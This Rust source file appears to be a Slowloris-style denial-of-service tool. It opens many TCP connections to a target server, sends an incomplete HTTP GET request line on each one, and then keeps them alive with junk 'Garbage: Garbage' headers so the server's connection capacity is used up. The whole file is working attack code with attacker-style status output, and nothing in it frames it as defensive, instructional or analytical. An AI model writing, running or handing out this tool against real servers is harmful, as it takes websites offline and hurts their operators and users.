use std::net::{IpAddr, AddrParseError, TcpStream};
use std::io::{Error, Write};

pub fn resolve_address(address: String) -> Result<IpAddr, AddrParseError> {
    return address.parse();
}

pub fn make_connections(target: IpAddr, port: u16,  socket_num: u16) -> Result<Vec<TcpStream>, Error> {
    let mut connections: Vec<TcpStream> = Vec::new();
    let mut last_error: Error = Error::new(std::io::ErrorKind::Other, "");
    for _ in 0..socket_num {
        let connection = match target {
            IpAddr::V4(x) => TcpStream::connect((x, port)),
            IpAddr::V6(x) => TcpStream::connect((x, port)),
        };
        match connection {
            Ok(x) => connections.push(x),
            Err(x) => last_error = x,
        }
    }
    if connections.is_empty() {
        return Err(last_error);
    } else {
        return Ok(connections);
    }
}

pub fn prepare_stream(stream: &mut TcpStream) -> Result<(), Error> {
    match stream.write("GET / HTTP/1.1\r\n".as_bytes()) {
        Ok(_) => return Ok(()),
        Err(e) => return Err(e),
    }
}

pub fn send_header(stream: &mut TcpStream) -> Result<(), Error> {
    match stream.write("Garbage: Garbage\r\n".as_bytes()) {
        Ok(_) => return Ok(()),
        Err(e) => return Err(e),
    }
}

pub fn send_headers(streams: &mut Vec<TcpStream>) -> Result<(), Error> {
    for i in 0..streams.len() {
        send_header(&mut streams[i])?;
    }
    return Ok(());
}

pub fn new_batch(target: IpAddr, port: u16, socket_num: u16) -> Result<Vec<TcpStream>, Error> {
    // Create connections
    println!("[*] Creating {} connections", socket_num);
    let mut streams: Vec<TcpStream>;
    match make_connections(target, port, socket_num) {
        Ok(s) => {
            println!("[*] Connections successful");
            streams = s;
        }
        Err(e) => {
            println!("[!] Error while creating connections ---- {}", e);
            return Err(e);
        }
    };

    // Send intial GET request line
    println!("[*] Preparing streams");
    for i in 0..streams.len() {
        match prepare_stream(&mut streams[i]) {
            Ok(_) => (),
            Err(e) => {
                println!("[!] Error while preparing stream ---- {}", e);
                return Err(e);
            }
        }
    }
    println!("[*] Prepared streams");

    return Ok(streams);
}